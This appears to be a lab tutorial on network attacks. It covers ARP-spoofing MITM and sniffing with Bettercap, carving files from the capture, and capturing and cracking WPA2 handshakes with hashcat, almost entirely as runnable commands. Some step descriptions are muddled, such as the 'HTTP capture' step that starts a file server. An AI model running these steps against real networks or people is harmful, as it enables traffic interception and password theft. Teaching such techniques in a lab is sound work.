# File Carving & WPA2 4-Way Handshake Cracking Documentation

## Tools Used
- **Bettercap** – For MITM attacks and packet capturing.
- **Wireshark** – For analyzing captured packets.
- **Foremost** – For file carving from packet captures.
- **Aircrack-ng** – For WPA2 handshake cracking.
- **Airmon-ng & Airodump-ng** – For monitoring wireless traffic and capturing WPA2 handshakes.

---

## Virtual Machine Setup
We will need **two VMs**:
1. **Attack VM** – Running Kali Linux (or any penetration testing OS) for executing attacks.
2. **Victim VM** – Running a standard OS (e.g., Windows or Linux) to simulate a target system.

Both VMs should be connected using a **network adapter** configured as follows:
- **For Wireless Attacks**: Use an external Wi-Fi adapter that supports monitor mode and packet injection.
- **For Wired Attacks**: Use a **bridged network adapter** to allow communication between VMs and external devices.

---


## Setting Up the Network Adapter

### For Wireless Interfaces (Monitor Mode)
1. Identify your network interface:
   ```bash
   sudo iwconfig
   ```
2. Put the wireless adapter in monitor mode:
   ```bash
   sudo airmon-ng start <interface_name>
   ```
   *Replace `<interface_name>` with the correct network interface (e.g., wlan0).*

### For Wired Interfaces (Bridge Mode)
1. Open your VM settings.
2. Navigate to the Network Preferences section.
3. Change the adapter type to Bridged Mode.
    
---

## Using Bettercap for MITM (with PCAP File)

### Step 1: Start Bettercap
Run Bettercap with the correct network interface:
```bash
sudo bettercap -iface <interface_name>
```
*Replace `<interface_name>` with your network interface, e.g., eth0, wlan0.*

### Step 2: Enable Packet Capture
Inside the Bettercap interactive console, run:
```bash
set net.sniff.output output.pcap
net.sniff on
```

### Step 3: Start ARP Spoofing
```bash
set arp.spoof.targets <target_IP>
arp.spoof on
```
*Replace `<target_IP>` with the victim’s IP address.*

### Step 4: Capture HTTP Requests
If targeting HTTP traffic:
```bash
set http.server.address <your_IP>
set http.server.path /tmp
http.server on
```
Using our edited HTTP, we created a file upload server.

### Step 5: Stop Packet Capture
```bash
net.sniff off
arp.spoof off
```

### Step 6: Exit Bettercap
```bash
exit
```

---

## Analyzing the PCAP File
The captured packets are stored in `output.pcap`. Open it with Wireshark:
```bash
wireshark output.pcap
```

---

## File Carving from PCAP
Use Foremost to extract files:
```bash
sudo foremost -i output.pcap -o extracted_files
```
### Review the Extracted Files
Navigate to the output directory:
```bash
cd extracted_files
```
Check inside directories categorized by file type (e.g., jpg, gif, png, etc.).

---

## WPA2 4-Way Handshake Cracking

Note: Make sure that your VM is in **Bridged Mode**

### 1. Capture the WPA2 Handshake
Use `airodump-ng` to capture the 4-way handshake, which results in a .cap or .pcap file:
```bash
sudo airodump-ng -c <channel> --bssid <router_BSSID> -w handshake_capture wlan0mon
```
The output file will be `handshake_capture.cap`.

### 2. Convert the Handshake for Hashcat
Hashcat requires a converted format (.hccapx or .22000).

#### Option A: Convert to .hccapx
```bash
cap2hccapx handshake_capture.cap handshake_converted.hccapx
```

#### Option B: Convert to .22000
```bash
hcxpcapngtool -o handshake_converted.22000 handshake_capture.cap
```

### 3. Run Hashcat on the Converted File
For an .hccapx file, use mode 2500:
```bash
hashcat -m 2500 handshake_converted.hccapx <path_to_wordlist>
```
For a .22000 file, use mode 22000:
```bash
hashcat -m 22000 handshake_converted.22000 <path_to_wordlist>
```

### 4. Tweak Hashcat Parameters
```bash
hashcat -m 22000 handshake_converted.22000 /usr/share/wordlists/rockyou.txt \
  --force --potfile-path=cracked.pot --status --status-timer=30
```
- `--force`: Bypass some warnings (use with caution).
- `--potfile-path`: Save found passwords.
- `--status`: Show status updates.
- `--status-timer=30`: Update status every 30 seconds.

### 5. Review Cracked Passwords
```bash
hashcat --show -m 22000 handshake_converted.22000
```

### 6. Tips & Notes
- Ensure GPU drivers (NVIDIA, AMD) and OpenCL/CUDA are installed.
- Use large wordlists like `rockyou.txt` for better results.
- Monitor GPU usage with `nvidia-smi` or `radeontop`.
- Ensure you have explicit permission before testing any WPA networks.
